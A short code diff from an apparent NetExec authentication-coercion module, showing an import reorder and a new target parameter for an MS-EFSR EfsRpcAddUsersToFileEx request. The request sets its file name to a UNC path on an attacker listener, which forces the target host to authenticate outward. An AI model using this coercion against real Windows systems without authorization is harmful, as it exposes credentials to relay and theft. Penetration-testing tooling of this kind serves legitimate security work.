@@ -1,8 +1,8 @@
 from impacket.dcerpc.v5.ndr import NDRCALL
 from impacket.dcerpc.v5.dtypes import WSTR, DWORD, NDRPOINTERNULL
 
-from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError
 from nxc.modules.coerce_plus_method.MS_EFSR.dtypes import ENCRYPTION_CERTIFICATE_LIST
+from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError
 
 
 class EfsRpcAddUsersToFileEx(NDRCALL):
@@ -21,7 +21,7 @@ class EfsRpcAddUsersToFileExResponse(NDRCALL):
     structure = ()
 
 
-def request(dce, listener):
+def request(dce, target, listener):
     request = EfsRpcAddUsersToFileEx()
     request["dwFlags"] = 0x00000002
     request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
